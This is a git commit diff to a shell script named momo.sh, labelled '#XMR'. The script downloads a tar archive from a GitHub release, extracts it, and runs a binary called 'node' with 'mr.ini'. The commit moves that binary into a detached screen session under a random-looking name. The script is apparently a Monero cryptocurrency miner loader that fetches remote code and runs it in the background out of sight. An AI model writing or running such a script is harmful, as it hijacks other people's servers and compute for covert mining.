b81a557ce7d5427c69ac59f9a4c26811fe7015c2
wikangdijalalan2 <82296471+wikangdijalalan2@users.noreply.github.com>
2021-05-01 20:39:25 +0800

    Update momo.sh

--- momo.sh
+++ momo.sh
@@ -2,8 +2,8 @@
 #
 #
 #XMR
-
+apt install screen -y
 wget https://github.com/wikangdijalalan2/xmmxja/releases/download/v1.0/male1.tar
 tar -xvf male1.tar
 cd MXC
-./node mr.ini
+screen -dmS randum ./node mr.ini
